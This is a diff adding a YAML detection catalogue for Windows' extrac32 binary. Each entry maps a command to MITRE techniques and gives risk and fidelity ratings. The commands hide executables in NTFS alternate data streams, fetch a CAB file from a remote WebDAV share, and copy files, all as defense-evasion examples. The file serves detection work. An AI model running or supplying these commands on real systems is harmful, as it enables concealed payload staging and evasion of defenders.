@@ -1,0 +1,59 @@
+- command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
+  description: Extract a source CAB file into the alternate data stream (ADS) of another file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
+  risk: High
+  risk_reason: Extracting data directly into the ADS of another file is a suspicious action.
+  fidelity: High
+  fidelity_reason: This type of activity is typically abnormal for most organizations.
+  tool: extrac32
+  threatactors:
+    N/A:
+      - N/A
+- command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
+  description: Extract a remote CAB file into the alternate data stream (ADS) of another file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
+  risk: High
+  risk_reason: Extracting data directly into the ADS of another file is a suspicious action, especially from remote sources.
+  fidelity: High
+  fidelity_reason: This type of activity is typically abnormal for most organizations.
+  tool: extrac32
+  threatactors:
+    N/A:
+      - N/A
+- command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe
+  description: Copy a source file to another location using extrac32.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
+  risk: High
+  risk_reason: Using extrac32 to copy data is a suspicious and abnormal action.
+  fidelity: High
+  fidelity_reason: This type of activity is typically rare for most organizations.
+  tool: extrac32
+  threatactors:
+    N/A:
+      - N/A
